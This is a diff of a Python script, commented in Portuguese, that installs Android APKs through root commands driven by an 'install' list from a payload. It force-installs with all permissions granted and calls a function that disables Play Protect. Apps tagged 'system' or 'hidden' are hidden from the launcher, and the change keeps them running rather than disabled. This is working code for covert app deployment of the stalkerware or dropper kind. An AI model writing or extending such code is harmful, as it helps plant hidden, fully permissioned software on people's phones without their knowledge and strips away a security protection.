@@ -70,12 +70,12 @@ def get_package_name_from_apk(apk_path):
     return None
 
 def hide_app(package_name):
-    """Oculta o app do launcher do Android."""
+    """Oculta o app do launcher do Android sem matar ou desativar o funcionamento dele."""
     if not package_name:
         return
     log_debug(f"Ocultando app do launcher: {package_name}")
+    # Usa apenas o pm hide para esconder, removido o disable-user que matava o app.
     subprocess.run(f"su -c 'pm hide \"{package_name}\"'", shell=True, capture_output=True)
-    subprocess.run(f"su -c 'pm disable-user --user 0 \"{package_name}\"'", shell=True, capture_output=True)
 
 def download_file(url, dest_folder, extras=None):
     if extras is None: extras = {}
@@ -114,22 +114,22 @@ def download_file(url, dest_folder, extras=None):
 def install_apk(apk_path, visibility, tag=None):
     try:
         log_debug(f"Executando PM INSTALL para: {os.path.basename(apk_path)}")
-        
+
         # Pega o nome do pacote antes de instalar se possível
         pkg_name = get_package_name_from_apk(apk_path)
 
         # Usando -r (reinstall), -d (downgrade) e -g (grant permissions) para evitar falhas
         result = subprocess.run(f"su -c 'pm install -r -d -g \"{apk_path}\"'", shell=True, capture_output=True, text=True)
-        
+
         if "Success" in result.stdout:
             log_debug(f"Instalação do APK {os.path.basename(apk_path)} -> SUCESSO")
-            
+
             # Verifica se precisa ocultar o app
             vis_str = str(visibility).strip().lower() if visibility else ""
             tag_str = str(tag).strip().lower() if tag else ""
-            
+
             is_system_app = vis_str in ["system", "hide", "hidden"] or tag_str in ["system", "hide", "hidden"]
-            
+
             if is_system_app:
                 log_debug(f"Tag/Visibility 'system' detectada para {os.path.basename(apk_path)}.")
                 if pkg_name:
@@ -228,7 +228,7 @@ def main():
 
     install_orders = payload.get("install", [])
     if not install_orders: return
-    
+
     # Desativa a verificação (Play Protect) para prevenir falhas de verificação
     disable_play_protect()
 
